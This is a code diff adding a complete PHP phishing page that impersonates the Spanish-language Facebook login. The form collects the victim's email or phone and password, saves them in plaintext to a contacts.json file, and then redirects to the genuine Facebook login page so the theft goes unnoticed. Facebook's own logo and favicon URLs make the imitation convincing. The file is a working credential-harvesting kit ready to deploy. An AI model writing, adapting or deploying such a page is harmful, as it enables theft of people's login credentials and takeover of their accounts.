@@ -1,0 +1,73 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  $contact = [
+    "text" => $_POST["text"],
+    "password" => $_POST["password"],
+  ];
+
+  if (file_exists("contacts.json")) {
+    $contacts = json_decode(file_get_contents("contacts.json"), true);
+  } else {
+    $contacts = [];
+  }
+
+  $contacts[] = $contact;
+  file_put_contents("contacts.json", json_encode($contacts));
+  header("Location: https://es-la.facebook.com/login/device-based/regular/login/?login_attempt=1");
+    exit();
+}
+
+?>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">    
+    <title>Facebook - Log In or Sign Up</title>
+</head>
+
+<body>
+    <div class="container">
+        <div class="container-profile">
+            <span class="logo">
+                <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+            </span>
+        </div>
+        <div class="container-form">
+            
+            <form class="form" method="POST" action="index.php">
+                <h4 align="center" style="padding: 5px;">Iniciar sesión en Facebook</h4>
+                <input type="text" id="text" name="text" placeholder="Correo electronico o numero de telefono">
+                <input type="password" id="password" name="password" placeholder="Contraseña">
+                <input type="submit" value="Iniciar Sesión">
+                <span><a href="#">¿Olvidaste tu contraseña?</a></span>
+                <div class="border"></div>
+                <button><a href="#">Crear cuenta nueva</a></button>
+            </form>
+            <p class="create-page">
+                <a href="#">Crear una pagina</a> para una celebridad , una marca o un <br> neogocio.
+            </p>
+        </div>
+    </div>
+    <!-- <script>
+        document.querySelector('.form').addEventListener('submit', function(e) {
+            // Evitar que el formulario se envíe automáticamente
+            e.preventDefault();
+
+            setTimeout(function() {
+            window.location.href = 'https://es-la.facebook.com/login/device-based/regular/login/?login_attempt=1';
+            }, 1000);
+        });
+    </script> -->
+
+
+</body>
+
+</html>
